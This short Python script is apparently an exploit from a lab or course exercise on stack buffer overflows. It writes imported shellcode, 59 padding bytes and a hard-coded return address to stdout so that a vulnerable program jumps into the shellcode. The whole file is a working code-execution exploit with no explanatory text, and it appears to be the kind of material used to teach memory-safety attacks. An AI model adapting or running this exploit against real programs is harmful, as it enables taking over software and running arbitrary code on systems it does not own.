from shellcode import shellcode
import sys
sys.stdout.buffer.write(shellcode)
blanks = b"\11" * 59
return_addr = b"\xbc\xad\xf6\xff"
sys.stdout.buffer.write(blanks + return_addr)